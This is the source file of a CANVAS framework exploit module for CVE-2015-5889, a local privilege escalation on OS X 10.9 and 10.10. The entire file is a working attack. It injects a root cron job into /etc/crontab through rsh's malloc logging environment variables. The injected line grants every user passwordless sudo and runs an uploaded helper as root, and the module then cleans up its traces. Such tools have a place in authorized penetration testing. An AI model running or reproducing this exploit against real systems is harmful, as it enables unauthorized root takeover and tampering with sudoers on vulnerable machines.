#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2006-2007
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import time
import uuid
import logging

from exploitutils import *
from canvaserror import *

from ExploitTypes.osxLocalExploit import osxLocalExploit
from osxNode import osxNode

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'OS X rsh/libmalloc local privilege escalation'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Apple'
DOCUMENTATION['Repeatability'] = 'Multiple Times'
DOCUMENTATION['CVE Name']      = 'CVE-2015-5889'
DOCUMENTATION['CVE Url']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5889'


VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Mac OS X'] ]
PROPERTY['VERSION']            = [ '10.9', '10.10' ]

DOCUMENTATION['Notes']         = """

Exploit should work on many different versions of MacOS X 64bit, but it has been
specifically tested on:
- 10.10.3
- 10.10.1
- 10.9.5

"""

class theexploit(osxLocalExploit):
    def __init__(self):
        osxLocalExploit.__init__(self)
        self.name               = NAME
        self.node               = None
        self.local_res          = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_exp         = '/tmp/x'
        self.remote_helper      = '/tmp/h'

        # Indicates if we should remove or simply backup crontab (if it existed before)
        self.should_remove_cron = True

    def read_file(self, path):
        fd = self.node.shell.open(path, self.node.shell.libc.getdefine('O_RDONLY'))
        if fd < 0:
            logging.error("Error while opening (%s)" % path)
            return None

        ret, st = self.node.shell.fstat(fd)
        if ret != 0:
            logging.error("Error on fstat (%s)" % path)
            return None

        sz = st['st_size']
        buf = self.node.shell.readfromfd(fd, sz)
        self.node.shell.close(fd)

        return buf

    def write_file(self, path, data):
        O_RDWR  = self.node.shell.libc.getdefine('O_RDWR')
        O_CREAT = self.node.shell.libc.getdefine('O_CREAT')
        fd = self.node.shell.open(path, O_RDWR | O_CREAT)
        if fd < 0:
            logging.error("Error while creating (%s)" % path)
            return None

        sz = len(data)

        self.node.shell.writetofd(fd, data)
        self.node.shell.close(fd)

    def exec_helper(self):
        lvars = {}
        lvars['CMD'] = "sudo %s" % self.remote_helper

        code = """
        #import "string", "CMD" as "CMD"

        #import "%s", "execl" as "execl"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "waitpid" as "waitpid"

        void
        main()
        {
            int pid;
            char *cmd;
            cmd = CMD;

            pid = fork();
            if (pid == 0) {
                execl("/bin/sh", "sh", "-c", cmd, NULL);
                exit(-1);
            }

            waitpid(pid, 0, 0);
            sendint(0);
        }
        """ % ("remote64" if hasattr(self.node.shell, "LP64") and self.node.shell.LP64 else "remote")

        ret = self.node.shell.runCode(code, lvars)
        return ret

    def run(self):
        for node in self.argsDict['passednodes']:
            self.summary[node] = 0
            self.node = node
            self.setInfo("%s (in progress on node %s)" % (self.name, self.node))

            if self.node.shell is None:
                logging.error("Node has no shell server available. Bailing")
                self.setInfo("%s Bailing (Node has no shell server available)" % (self.name))
                continue

            if not self.is_osx_node():
                continue

            if self.compromised(self.remote_helper, 0):
                logging.warning('Already compromised')
                logging.info('Initing elevated MOSDEF loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                logging.info('Done')
                self.setInfo("%s Done (Success)" % (self.name))
                self.setProgress(100)
                self.add_file_for_cleanup(self.remote_helper)
                continue

            logging.info('Uploading helper')
            if self.nodeUpload(self.local_helper_64, self.remote_helper) == False:
                logging.error("An error occurred while uploading our helper binary")
                self.setInfo("%s Done (Failed to upload helper)" % (self.name))
                continue
            self.setProgress(60)

            self.add_file_for_cleanup(self.remote_helper)

            O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
            fd = self.node.shell.open("/etc/crontab", O_RDONLY, 0755)
            ret, st = self.node.shell.fstat(fd)
            if fd != -1:
                self.node.shell.close(fd)

            if ret == 0:
                logging.debug("We should backup cron")
                self.should_remove_cron = False

            if not self.should_remove_cron:
                logging.info("Backing up crontab")
                tmp_crontab = os.path.join("/tmp/", uuid.uuid4().hex)
                self.node.runcommand("/bin/cp -p /etc/crontab %s" % tmp_crontab)
                self.add_file_for_cleanup(tmp_crontab)

            logging.info('Executing exploit')

            env = {}
            env['MallocLogFile'] = '/etc/crontab'
            env['MallocStackLogging'] = 'yes'
            env['MallocStackLoggingDirectory'] = 'gg\n* * * * * root echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers | sudo %s\n\n\n\n\n' % self.remote_helper

            args = {}
            args['string_1'] = 'localhost'

            self.fork_and_exec("/usr/bin/rsh", argv=args, envp=env)
            logging.info('Waiting... Might take up to a minute for crontab')

            self.setProgress(90)

            # wait 70 secs for the exploit to complete, might take up to a minute
            # depending on the time you are running this
            wait_secs = 70
            if self.compromised(self.remote_helper, wait_secs):
                self.summary[node] = 1
                logging.warning('Compromised!')
                logging.info('Upgrading MOSDEF connection loop')
                self.fork_and_exec(self.remote_helper, wait = 1)

                logging.info("Restoring crontab and sudoers to their original state")
                # make sure rlogin dies otherwise it might end up writing to /etc/crontab again
                # after we restore it
                self.node.runcommand("sudo killall rlogin")

                # crontab
                if self.should_remove_cron:
                    self.node.runcommand("sudo /bin/rm /etc/crontab")
                else:
                    self.node.runcommand("sudo /bin/cp -p %s /etc/crontab" % tmp_crontab)

                # sudoers
                tmp_file_1 = os.path.join("/tmp/", uuid.uuid4().hex)
                tmp_file_2 = os.path.join("/tmp/", uuid.uuid4().hex)

                self.node.runcommand("sudo /bin/cp /etc/sudoers %s" % tmp_file_1)
                self.node.runcommand("sudo /bin/chmod 446 %s" % tmp_file_1)

                # remove last line we added from sudoers
                l = self.read_file(tmp_file_1)
                z = l.split("\n")
                del z[len(z) - 2]
                l = '\n'.join(z)

                self.node.runcommand("sudo /bin/rm %s" % tmp_file_1)

                self.write_file(tmp_file_2, l)
                a = self.node.runcommand("sudo /bin/cp %s /etc/sudoers" % tmp_file_2)
                self.nodeDeleteFile(tmp_file_2)

                self.add_file_for_cleanup(tmp_file_2)

                logging.info('Done')
                self.setInfo("%s Done (Success)" % (self.name))
            else:
                logging.error('Looks like we failed, try again!')
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)

        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
